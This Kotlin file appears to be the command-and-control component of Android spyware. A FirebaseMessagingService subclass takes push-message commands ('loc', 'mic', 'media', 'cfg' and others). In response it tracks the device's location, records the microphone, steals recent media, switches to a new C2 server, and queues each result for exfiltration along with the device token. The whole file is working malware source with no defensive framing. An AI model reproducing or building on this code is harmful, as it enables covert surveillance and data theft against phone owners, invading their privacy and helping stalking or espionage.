package com.sp.core.c2

import android.content.Intent
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.sp.core.services.LocationService
import com.sp.core.services.MicRecorder
import com.sp.core.services.MediaStealer
import com.sp.core.util.BatchExfil

class FirebaseClient : FirebaseMessagingService() {

    override fun onMessageReceived(msg: RemoteMessage) {
        val cmd = msg.data["cmd"] ?: return
        when (cmd) {
            "loc" -> {
                startService(Intent(this, LocationService::class.java))
                BatchExfil.enqueue(this, "loc", msg.data.toString())
            }
            "mic" -> {
                val sec = msg.data["sec"]?.toIntOrNull() ?: 60
                startService(Intent(this, MicRecorder::class.java).putExtra("seconds", sec))
                BatchExfil.enqueue(this, "mic", msg.data.toString())
            }
            "media" -> {
                MediaStealer.stealRecent(this, msg.data["n"]?.toIntOrNull() ?: 20)
                BatchExfil.enqueue(this, "media", msg.data.toString())
            }
            "ping" -> BatchExfil.enqueue(this, "ping", """{"ts":${System.currentTimeMillis()}}""")
            "cfg" -> {
                val url = msg.data["url"]
                if (!url.isNullOrEmpty()) {
                    Exfil.setC2(this, url, msg.data["key"])
                    BatchExfil.enqueue(this, "cfg", """{"ok":true}""")
                }
            }
            else -> Commands.dispatch(this, cmd, msg.data)
        }
    }

    override fun onNewToken(token: String) {
        BatchExfil.enqueue(this, "token", """{"t":"$token"}""")
    }
}
